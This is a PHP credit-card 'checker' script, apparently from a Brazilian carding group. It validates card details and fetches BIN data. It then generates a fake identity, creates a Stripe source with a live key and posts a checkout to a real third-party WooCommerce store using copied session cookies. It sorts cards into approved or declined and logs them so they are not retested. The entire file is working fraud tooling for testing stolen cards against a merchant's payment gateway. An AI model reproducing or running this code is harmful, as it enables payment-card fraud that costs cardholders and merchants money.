<?php

//strtoupper — Converte uma string para maiúsculas Ex: $teste = strtoupper(getStr($resposta, '',''));
// $variavel = (int)getStr2($pay, '',''); - (int) "Puchar valores inteiros da variavel"
// html_entity_decode - Converte HTML para retorno JSON (espeficico para pages sem JSON)
// str_shuffle = Embaralha nomes na string
// substr_count — Count the number of substring occurrences
// implode  - A função implode() retorna uma string dos elementos de um array.
// stristr - Pesquisa e retorna valores tipo, 'substr'
// empty = Retorna se a variavel esta vazia. Ex: if (empty($teste))
// null - Outra forma de retornar se esta vazia. (funciona em algumas ocassioes)


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }



 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$ant_noia = substr($lista, 0, 8);


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}

if (($cvv == 000 )!== false){

    die("Error => Tacando 000 né? Por sua conta infelizmente nao foi seu dia kkk..");

}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}


 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============



 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}

// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)


// ================ // ====================//==========================//============================= // ================================//=================//

$header_stripesrc = array (

'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'

);


$link_stripesrc = "https://api.stripe.com/v1/sources";

$postfields_stripesrc = 'type=card&owner[name]='.$nome.'&owner[address][line1]='.$endereco.'&owner[address][line2]=Casa&owner[address][state]=SP&owner[address][city]='.$cidade.'&owner[address][postal_code]='.$cep.'&owner[address][country]=BR&owner[email]=minhapicadura@gmail.com&owner[phone]='.$telefone_fixo.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=30f5d6b2-8643-479d-87b9-b09258a3630bda3910&muid=73a0a8b3-c4e3-4c2c-94e0-8761cabd8a14ef7a24&sid=9d38ca7a-6113-44f7-a419-5abf72dfc4f00f9265&pasted_fields=number&payment_user_agent=stripe.js%2F2a52b1633%3B+stripe-js-v3%2F2a52b1633&time_on_page=22364&key=pk_live_6vb6ZFdU3Y45u0dDzP0T0as5';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_stripesrc);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_stripesrc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_stripesrc);
$meupiru = curl_exec($ini);
$id_do_carai = metraiapuxar($meupiru, 'id": "', '"', 1);


$nonce_carai = metraiapuxar($meupiru, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"', 1); // FIS POR FAZER CASO PRECISA PUCHAR NO POSTFIELDS.


$header_pagar = array (

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: ppwp_wp_session=2d58f0ac869f66ecfc209f03636739b9%7C%7C1664766359%7C%7C1664765999; __stripe_mid=73a0a8b3-c4e3-4c2c-94e0-8761cabd8a14ef7a24; __stripe_sid=9d38ca7a-6113-44f7-a419-5abf72dfc4f00f9265; woocommerce_items_in_cart=1; wp_woocommerce_session_feaf5f2b0ab116c72a8e8bac5adaa9a4=t_b5be57ce8d4adfe91c83797d3eb7bd%7C%7C1664937369%7C%7C1664933769%7C%7Ce18cc43a46ffd05ff2567d4d71732930; woocommerce_cart_hash=8c5d185455fc14cc511fbed07d18de82', // ESTA PORRA SEMPRE ATUALIZA-SE, ENTAO QUANDO DER SESSION_EXPIRED NO RETORNO.... ACESSE O LINK DO HEADER REFERRER TROQUE O COOKIE MANUALMENTE, SE NAO SABE FAZER ISSO VAI ATRÁS DE QUEM SAIBA PELO AMOR DE DEUS KKKK.....
'origin: https://itsgoingdown.org',
'referer: https://itsgoingdown.org/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
'x-requested-with: XMLHttpRequest'


);

$link_pagar = "https://itsgoingdown.org/?wc-ajax=checkout";

$postfields_pagar = 'billing_first_name='.$nome.'&billing_last_name='.$nome.'&billing_company=&billing_country=BR&billing_address_1='.$endereco.'&billing_address_2=Casa&billing_city='.$cidade.'&billing_state=SP&billing_postcode='.$cep.'&billing_phone='.$telefone_fixo.'&billing_email=minhapicadura@gmail.com&order_comments=&payment_method=stripe&terms=on&terms-field=1&tnp-nlang=&woocommerce-process-checkout-nonce=963ae1dcf8&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id_do_carai.'';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_pagar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
$pagar = curl_exec($ini);



$retorno = json_decode($pagar, true)['messages'];


$retorno_true = metraiapuxar($pagar, '{',',', 1);
$retorno_denny = json_decode($pagar, true)['result'];




if (strpos($retorno_true, '"result":"failure"')!== false){

    $Verificacao_live = 'N/A - Allow Denny: '.$retorno_denny.'';

} else if (empty($retorno_true)) {

    $Verificacao_live = "Retorno nao indentificado: N/A";

}

else {

    $Verificacao_live = 'Order received: '.$retorno_true.'';

}


if(strpos($pagar, '"result":"failure"')!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> $Verificacao_live <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

} else if (empty($pagar)) {

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> Error de Proxy..!  ($Verificacao_live)<br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-warning'>RETORNO</span> $Verificacao_live <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");



}

?>